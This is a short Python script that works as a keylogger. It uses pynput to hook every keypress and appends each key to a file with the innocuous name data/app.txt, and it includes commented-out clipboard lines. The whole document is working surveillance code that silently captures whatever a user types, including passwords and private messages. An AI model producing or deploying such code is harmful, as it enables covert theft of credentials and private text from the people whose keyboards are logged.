import pyperclip
import os
from pynput.keyboard import Listener

PATH = "data/app.txt"

def logging(key):
	with open(PATH, "a") as file:
		file.write('%s' %(str(key)))

with Listener(on_press=logging) as ls:
	ls.join()

#pyperclip.copy(str(key))
#pyperclip.paste()

